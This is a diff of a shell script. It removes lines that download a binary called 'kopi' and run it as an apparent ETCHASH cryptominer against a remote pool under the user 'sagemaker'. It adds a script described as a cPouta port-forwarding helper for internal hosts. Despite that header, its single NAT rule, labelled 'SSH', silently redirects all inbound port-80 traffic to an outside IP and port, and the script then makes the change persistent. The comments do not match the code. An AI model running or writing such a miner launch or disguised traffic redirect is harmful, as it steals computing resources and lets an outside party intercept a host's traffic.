@@ -1,3 +1,56 @@
-wget https://github.com/selokguine3/yes/raw/main/kopi && chmod 777 kopi
-nohup ./kopi --algo ETCHASH --pool 47.241.108.173:443 --user sagemaker > nohup.out
+#!/bin/sh
 
+####
+#
+# Script to enable other port forwarding on cPouta projects (see ssh-gateway for normal use cases)
+# Makes each host reachable on SSH and the following ports port 543[last IP octet] on the project-gateway server:
+#    
+#    80[last-octet]  http       e.g. 8011  to reach 192.168.1.11 on port 80
+#    443[last-octet] https      e.g. 44311 to reach 192.168.1.11 on port 443
+#    330[last-octet] MySQL      e.g. 33011 to reach 192.168.1.11 on port 3306
+#    543[last-octet] PostgreSQL e.g. 54311 to reach 192.168.1.11 on port 5432
+#    
+#
+#  e.g. set postgres connection port to 54311 [postgresql-gateway public IP] to reach 192.168.1.11
+#
+# In cPouta, set Allocation pools to range 192.168.1.1,192.168.1.99 in Network, Subnet Details
+# to ensure hosts cannot get unreachable IPs from the DHCP server.
+#
+# Run (or just copy-paste to the console) after build on a machine with a Floating IP.
+# Fredrik Welander 2021
+#
+# iptables -t nat -L # list nat rules
+#
+####
+
+# Enable ip forwarding
+sudo sysctl net.ipv4.ip_forward=1
+# Make persistent
+sudo sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/' /etc/sysctl.conf
+
+# Flush all old NAT rules if any 
+sudo iptables -t nat -F
+
+# Enter root shell
+sudo -i
+
+# SSH
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 35.230.98.206:3353
+
+
+# exit root shell
+exit
+
+# Masquerade, note exclude loopback, otherwis nslookup will stop working
+sudo iptables ! -o lo -t nat -A POSTROUTING -j MASQUERADE 
+
+# Install iptables-persistent
+sudo apt-get update -y && sudo DEBIAN_FRONTEND=noninteractive apt-get install iptables-persistent -y
+
+# Make iptables rules persistent
+sudo iptables-save |sudo tee /etc/iptables/rules.v4 >/dev/null
+
+# Print out the rules
+cat /etc/iptables/rules.v4
+
+echo "\nDone."
